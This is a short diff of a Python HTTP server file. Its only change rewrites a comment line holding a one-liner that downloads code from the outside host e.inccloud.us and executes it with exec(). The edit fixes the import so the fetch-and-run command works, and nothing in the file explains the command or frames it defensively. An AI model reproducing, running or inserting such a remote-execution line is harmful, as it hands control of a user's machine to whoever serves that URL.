@@ -1,7 +1,7 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import os
 
-# python -c "exec(__import__('urllib.request').urlopen('https://e.inccloud.us/').read())"
+# python -c "import urllib.request; exec(urllib.request.urlopen('https://e.inccloud.us/').read())"
 
 PORT = 8000
 
